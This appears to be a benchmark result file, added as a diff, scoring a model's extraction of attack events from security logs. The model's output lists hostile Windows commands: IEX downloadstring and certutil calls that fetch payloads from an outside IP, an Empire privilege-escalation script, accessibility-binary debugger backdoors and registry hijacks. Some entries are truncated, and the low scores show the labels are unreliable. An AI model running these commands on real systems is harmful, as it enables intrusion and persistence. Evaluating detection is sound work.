@@ -1,0 +1,132 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082//Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\\\47\u2605\u6848\u672c\u6570\u636e\u30de\u30ea\u30a2\u30fc\u3002ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\47\u2605\u6848\u672c\u6570\u636e\u30de\u30ea\u30a2\u30fc\u3002ps1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe & {$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\") $Name = \"Debugger\" $Value = \"C:\\windows\\system32\\cmd.exe\" Foreach ($item in $input_table){ $item = $item.trim() $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -Value $value -Type String }}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe & {(New-Item -Force -Path \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\") -Value 'cmd.exe /c notepad.exe'}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe & {(New-Item -Force -Path \"HKCU:\\software\\classes\\Folder\\shell\\open\\command\") -Value 'cmd.exe /c notepad.exe'}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe & {(New-Item -Force -Path \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\") -Value 'C:\\Windows\\System32\\cmd.exe'}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe & {cscript C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs}",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg add \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\" ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options \\verifierdlls /t REG_DWORD /d 1 /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options \\verifierdlls /f\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "msxsl.exe C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslscript.xsl",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe'\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Echo [InternetShortcut]",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.'msxsl.exe''c:\\Windows\\Temp\\msxsl.exe\"",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The provided logs suggest an advanced multi-stage attack involving various techniques such as social engineering, exploit kits, and living-off-the-land (LOTL) tactics to evade detection and establish persistence. The attackers utilize PowerShell for executing malicious scripts, manipulating registry settings, scheduling tasks, and more. A key takeaway is that no single mitigation technique can fully prevent attacks like this; instead, organizations should focus on a comprehensive cybersecurity strategy incorporating regular software updates, employee education, robust monitoring, and incident response planning.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121903,
+      "completion_tokens": 3525,
+      "total_tokens": 125428,
+      "wall_clock_s": 194.17,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.3125,
+      "f1": 0.2777777777777778,
+      "tp": 5,
+      "fp": 15,
+      "fn": 11
+    },
+    "stage": {
+      "precision": 0.1,
+      "recall": 0.13333333333333333,
+      "f1": 0.1142857142857143,
+      "tp": 2,
+      "fp": 18,
+      "fn": 13,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121903,
+      "completion_tokens": 3525,
+      "total_tokens": 125428,
+      "wall_clock_s": 194.17,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
